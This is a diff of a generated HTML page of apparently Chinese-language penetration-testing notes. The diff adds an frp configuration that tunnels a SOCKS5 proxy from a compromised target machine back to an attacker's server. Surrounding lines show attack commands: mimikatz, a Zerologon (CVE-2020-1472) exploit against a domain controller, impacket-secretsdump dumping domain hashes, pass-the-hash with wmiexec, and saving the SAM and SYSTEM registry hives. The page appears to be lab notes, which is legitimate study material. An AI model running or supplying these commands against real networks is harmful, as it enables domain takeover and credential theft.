@@ -366,7 +366,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-09-29 17:28:15'>2024-09-29 17:25</time>
+            Created At : <time class="date" title='Updated At: 2024-09-29 17:48:33'>2024-09-29 17:25</time>
         
     </div>
     <div class="article-meta">
@@ -788,7 +788,27 @@ mimikatz # !-
 </code></pre>
 </li>
 </ul>
-<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a>     </p>
+<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<pre><code class="bash"> frps -c frps.ini
+# 客户端
+frpc -c frpc.ini
+</code></pre>
+<pre><code>#服务端配置
+    [common]
+    bind_port=8080
+
+#靶机客户端
+    [common]
+    server_addr=服务器端外网IP
+    server_port=8080
+    [socks5]
+    type=tcp
+    remote_port=12345
+    plugin=socks5
+    use_encryption=true
+    use_compression=true
+</code></pre>
+<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a>     </p>
 <pre><code> sudo ./nps install
  sudo nps start
 </code></pre>
@@ -1075,7 +1095,7 @@ plugin = socks5
 <p>#利用exp重置密码</p>
 <p>proxychains python3 cve-2020-1472-exploit.py dc 10.10.10.10</p>
 <h1 id="no-pass-dump-域控hash"><a href="#no-pass-dump-域控hash" class="headerlink" title="-no-pass dump 域控hash"></a>-no-pass dump 域控hash</h1><p>proxychains impacket-secretsdump  de1ay.com&#x2F;dc$@10.10.10.10 -no-pass  </p>
-<p>proxychains impacket-wmiexec   -hashes  LM:NTLM    .&#x2F;<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#105;&#115;&#116;&#x72;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#48;&#46;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#49;&#48;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#105;&#115;&#116;&#x72;&#97;&#116;&#111;&#x72;&#x40;&#x31;&#48;&#46;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#49;&#48;</a></p>
+<p>proxychains impacket-wmiexec   -hashes  LM:NTLM    .&#x2F;<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#111;&#114;&#64;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#x31;&#48;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#111;&#114;&#64;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#x31;&#48;</a></p>
 <p>#恢复hash<br>powershell Reset-ComputerMachinePassword</p>
 <h1 id="保存注册表"><a href="#保存注册表" class="headerlink" title="保存注册表"></a>保存注册表</h1><p>reg save HKLM\SYSTEM system.save  </p>
 <p>reg save HKLM\SAM sam.save  </p>
